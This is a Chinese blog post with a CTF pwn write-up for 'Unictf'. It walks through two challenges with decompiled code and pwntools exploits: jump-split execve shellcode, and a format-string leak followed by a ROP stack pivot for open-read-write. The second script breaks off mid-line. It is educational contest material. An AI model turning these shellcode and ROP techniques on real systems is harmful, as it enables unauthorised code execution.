@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Unictf | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Unictf1.什么？我不是汇编高手吗？1234567891011121314151617181920212223242526272829303132333435363738394041int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  int v4; &#x2F;&#x2F; [rsp+8h] [rbp-28h]  i">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Unictf">
+<meta property="og:url" content="http://example.com/2026/02/25/Unictf/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Unictf1.什么？我不是汇编高手吗？1234567891011121314151617181920212223242526272829303132333435363738394041int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  int v4; &#x2F;&#x2F; [rsp+8h] [rbp-28h]  i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-02-25T11:07:36.000Z">
+<meta property="article:modified_time" content="2026-02-25T13:05:15.320Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/02/25/Unictf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Unictf',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Unictf</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Unictf"><a href="#Unictf" class="headerlink" title="Unictf"></a>Unictf</h1><h2 id="1-什么？我不是汇编高手吗？"><a href="#1-什么？我不是汇编高手吗？" class="headerlink" title="1.什么？我不是汇编高手吗？"></a><code>1.什么？我不是汇编高手吗？</code></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  _BYTE *addr_1; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *addr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  addr = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == (_BYTE *)<span class="number">-1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, addr);</span><br><span class="line">  addr_1 = addr;</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &amp;&amp; addr_1 &lt; addr + <span class="number">4091</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      n10 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( n10 == <span class="number">-1</span> || n10 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      addr_1[i + <span class="number">1</span>] = n10;</span><br><span class="line">      ++n4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *addr_1 = <span class="number">0xE9</span>;</span><br><span class="line">      addr_1 += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect(addr, <span class="number">0x1000u</span>LL, <span class="number">5</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))addr)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，程序分配了一处地址，具有可读可写的权限。然后给了我们地址。后面限制了我们读入的大小，并且循环输入4字节，直到遇到\n结束。并且会在首地址写入\xe9。再循环。最后修改地址为可读可执行。并且执行地址里我们写入的东西。所以理论上我们只需要写入shellcode到addr就可以了。</p>
+<p>但是，我们得先搞明白\xe9是什么。</p>
+<p>在汇编语言中，<strong>E9字节码</strong>代表的是<strong>近跳转（Near Jump）[&amp;指令。它允许程序跳转到同一段内的目标地址，通常用于实现流程控制。E9后面紧跟的参数是一个</strong>相对偏移量&amp;]，用于计算跳转的目标地址。</p>
+<p>E9指令的目标地址计算公式如下： <strong>目标地址 &#x3D; 当前指令地址 + 指令长度 + 偏移量（RVA）</strong></p>
+<ul>
+<li><strong>当前指令地址</strong>是E9指令的起始地址。</li>
+<li><strong>指令长度</strong>固定为5字节（E9本身占1字节，后续偏移量占4字节）。</li>
+<li>**RVA（Relative Virtual Address）**是相对虚拟地址，表示目标地址相对于当前指令的偏移。</li>
+</ul>
+<p>了解完后，我们再看ida，发现存在后门函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getshell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /data/flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而且程序没开pie。那么我们是不是只要按照e9的公式来进行跳转就可以了呢？</p>
+<p>很可惜，不是。因为addr的地址有程序分配，一般都是0x7f…，而我们getshell()的地址是0x4011f6。所以是远远超过我们的最大偏移量的——也就是32位的最大值。</p>
+<p>所以这里的后门实际上是只给我们看的，是碰不到的。</p>
+<p>那我们只能老老实实打shellcode。</p>
+<p>可是问题又来了。由于\xe9的存在。所以导致我们每一个输入的四字节大小的内容，都会被\xe9当作偏移量。也就是说，我们分字节输入的shellcode全成了偏移量，整个程序完全是在乱跳。根本执行不了我们的shellcode。</p>
+<p>这个时候该怎么办呢？</p>
+<p>其实我们写入shellcode的困难就在于\xe9。只要我们绕过它不就行了吗！所以这里引入一个\xeb。</p>
+<p>什么是\xeb呢？</p>
+<p>\xeb是短跳转。和\xe9类似。不过只有后面一个字节会被当作偏移量。那么好，想象一下以下场景。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e9 00 00 00 01 e9 xx xx eb 01 e9 xx xx eb 01 ......</span><br></pre></td></tr></table></figure>
+
+<p>这里先不考虑大小端序的问题了。</p>
+<p>如果我们能把shellcode分成若干个2字节，再跳过每一个\xe9，不就可以了吗？</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">39461</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(addr))</span><br><span class="line">backdoor = <span class="number">0x4011f6</span></span><br><span class="line">payload = <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span></span><br><span class="line">chunks = [</span><br><span class="line"><span class="string">b&#x27;\x31\xf6&#x27;</span>, <span class="comment"># xor rsi,rsi</span></span><br><span class="line"><span class="string">b&#x27;\x56\x90&#x27;</span>, <span class="comment"># push rsi;nop</span></span><br><span class="line"><span class="string">b&#x27;\x31\xc0&#x27;</span>, <span class="comment"># xor eax,eax</span></span><br><span class="line"><span class="string">b&#x27;\xb4\x68&#x27;</span>, <span class="comment"># mov ah.0x68</span></span><br><span class="line"><span class="string">b&#x27;\xb0\x73&#x27;</span>, <span class="comment"># mov al,0x73</span></span><br><span class="line"><span class="string">b&#x27;\x66\x50&#x27;</span>, <span class="comment"># push ax</span></span><br><span class="line"><span class="string">b&#x27;\xb4\x2f&#x27;</span>, <span class="comment"># mov ah, 0x2f </span></span><br><span class="line"><span class="string">b&#x27;\xb0\x2f&#x27;</span>, <span class="comment"># mov al, 0x2f </span></span><br><span class="line"><span class="string">b&#x27;\x66\x50&#x27;</span>, <span class="comment"># push ax</span></span><br><span class="line"><span class="string">b&#x27;\xb4\x6e&#x27;</span>, <span class="comment"># mov ah, 0x6e </span></span><br><span class="line"><span class="string">b&#x27;\xb0\x69&#x27;</span>, <span class="comment"># mov al, 0x69 </span></span><br><span class="line"><span class="string">b&#x27;\x66\x50&#x27;</span>, <span class="comment"># push ax</span></span><br><span class="line"><span class="string">b&#x27;\xb4\x62&#x27;</span>, <span class="comment"># mov ah, 0x62 </span></span><br><span class="line"><span class="string">b&#x27;\xb0\x2f&#x27;</span>, <span class="comment"># mov al, 0x2f </span></span><br><span class="line"><span class="string">b&#x27;\x66\x50&#x27;</span>, <span class="comment"># push ax</span></span><br><span class="line"><span class="string">b&#x27;\x54\x5f&#x27;</span>, <span class="comment"># push rsp;pop rdi</span></span><br><span class="line"><span class="string">b&#x27;\x31\xd2&#x27;</span>, <span class="comment"># xor edx,edx</span></span><br><span class="line"><span class="string">b&#x27;\x31\xc0&#x27;</span>, <span class="comment"># xor eax,eax</span></span><br><span class="line"><span class="string">b&#x27;\xb0\x3b&#x27;</span>, <span class="comment"># mov al,59</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>, <span class="comment"># syscall</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chunks:</span><br><span class="line">    payload += c + <span class="string">b&#x27;\xeb\x01&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于2字节写入的限制。所以这里特意用了16位寄存器。<code>ah</code>，<code>al</code>，<code>ax</code>。所以我们可以把’&#x2F;bin&#x2F;&#x2F;sh’分多次写入。再依次压入栈。就可以平凑出完成的shellcode了。真是很巧妙。</p>
+<h2 id="2-speak"><a href="#2-speak" class="headerlink" title="2.speak"></a><code>2.speak</code></h2><p>一道对栈结构布局有很大要求的题。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  init_seccomp();</span><br><span class="line">  register_name();</span><br><span class="line">  <span class="built_in">printf</span>(welcome);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先来看程序做了什么。</p>
+<p>首先就是初始化等等。然后设置了沙箱。所以这道题我们显然只能打orw了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>然后我们看一下register_name()做了什么。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">register_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>LL);</span><br><span class="line">  s[<span class="number">48</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(name, s);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，我们可以往s里输入最多不超过0x30字节大小的内容。然后复制到name里。然后刷新了bss头的内容。我们点开name可以看到存在于bss段上，地址为<code>0x4060</code>。然后程序就会打印welcome里的内容。巧妙的是welcome也在bss段上。同时地址为<code>0x4080</code>。那么只要我们填满0x20的空隙，就可以泄露栈上地址了。所以第一个点就是非栈上的格式化字符串泄露。</p>
+<p>通过这个漏洞我们可以得到栈地址，libc基地址，程序基址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;%9$p&#x27;</span> + <span class="string">b&#x27;%41$p&#x27;</span> + <span class="string">b&#x27;%45$p&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x2a1ca</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) -<span class="number">0x13dd</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的偏移可以通过gdb去调试。唯一要注意的一点就是，官方的wp泄漏的是偏移量为6处的栈地址。不过由于本地和远端链接的问题，打本地的时候，按照6的偏移是泄露不出栈地址的。所以我们可以去泄露偏移为9的地址。这样本地和远端是都可以打通的。</p>
+<p>我们仔细阅读程序可以看出。这里不存在栈溢出。而且是系统调用的sys_exit。也就是说，我们根本运行不到return 0;的地方。就算有栈溢出也没有用。难道没有办法了吗？</p>
+<p>格式化字符串的漏洞让我们可以执行我们的rop链。由于我们栈溢出不了，那我们只要让程序跳到我们rop链的头就好了。也就是说，只要我们能劫持程序执行流就可以了。</p>
+<p>所以我们可以去改写printf的返回地址为main函数的leave；ret去打栈迁移。首先我们要看懂printf最后是怎么跳转到main函数的。</p>
+<p><img src="/images/uni1.png" alt="gdb"></p>
+<p>可以看出，当程序执行printf函数时。最后会有一个leave；ret的指令。同时由于main函数最后也有一个leave；ret。所以这里就形成了栈迁移的布局。也是十分巧妙了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;nc1.ctfplus.cn&#x27;,14620)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;%9$p&#x27;</span> + <span class="string">b&#x27;%41$p&#x27;</span> + <span class="string">b&#x27;%45$p&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x2a1ca</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) -<span class="number">0x13dd</span></span><br><span class="line">ebp = stack - <span class="number">0xe8</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">success(<span class="built_in">hex</span>(pie))</span><br><span class="line">success(<span class="built_in">hex</span>(ebp))</span><br><span class="line">pop_rdi = base + <span class="number">0x10f78b</span></span><br><span class="line">pop_rsi = base + <span class="number">0x110a7d</span></span><br><span class="line">rdx_leave_ret = base + <span class="number">0x981ad</span></span><br><span class="line">o = base + libc.sym.<span class="built_in">open</span></span><br><span class="line">r = base + libc.sym.read</span><br><span class="line">p = base + libc.sym.puts</span><br><span class="line">bss = pie + <span class="number">0x4020</span> + <span class="number">0x500</span></span><br><span class="line">s1 = (ebp+<span class="number">0x40</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">s2 = <span class="number">0x100</span> + <span class="number">0xec</span> - (s1&amp;<span class="number">0xff</span>) <span class="comment">#由于算的是总的字节数。在前面写过s1的前提下，s1+s2 = 0x?? + 0x100 + 0xec。又由于是单字节写入，所以只会写入\xec。也是很巧妙的。</span></span><br><span class="line">flag = ebp + 